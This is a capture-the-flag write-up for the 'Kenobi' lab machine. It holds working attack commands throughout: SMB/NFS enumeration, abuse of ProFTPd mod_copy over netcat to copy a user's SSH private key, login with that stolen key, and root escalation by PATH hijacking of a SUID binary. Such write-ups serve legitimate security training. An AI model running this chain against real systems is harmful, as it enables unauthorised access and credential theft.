# Kenobi

## Enumerating Samba
---
```bash
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.194.68 
# enumerates samba shares

$ smbclient //<ip>/anonymous
# connects to the machines network share

$ smbget -R smb://<ip>/anonymous
# R for recursive, get all files

$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.194.68
# rpcbind port is access to a file network system in this case, scans open rpcbind port


$ searchsploit ProFTPd 1.3.5
# cool tool for searching exploits
```
## Exploiting FTPPro
---
In *log.txt* we find where *kenoby* saved his ssh private key */home/kenobi/.ssh/id_rsa*

The *mod_copy* module implements *SITE CPFR* and *SITE CPTO* commands, which can be used to copy files from one place to another on the server.
Any *unauthentificated* user can exploit this to move files around.

We connect to *FTP* using *netcat* and then execute the above commands to move the *ssh private key*
```bash
$ nc $IP 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```
We know */var* was a mount we could see based on the *nmap scan* or alternatively the *enum4linux* scan

We have to mount the */var/tmp* directory to our machine
```bash
$ mkdir /myfolder
$ sudo mount $IP:/var /myfolder
$ ls -la /myfolder
```
We can find our *RSA private key* in the */tmp* folder, then we can connect with it
```bash
$ chmod 700 id_rsa
$ ssh -i id_rsa kenobi@$IP
```

## Privesc
---
```bash
$ find / -perm -u=s -type f 2>/dev/null
# find SUID files
```
We found */usr/bin/menu*
```bash 
$ strings /usr/bin/menu

curl -I localhost
uname -r
ifconfig
```
It seems like it is running commands without a full path to them.
We can exploit this.

```bash
$ echo "/bin/sh" > curl
$ chmod 777 curl
$ export PATH=/home/kenobi:$PATH
$ /usr/bin/menu
```

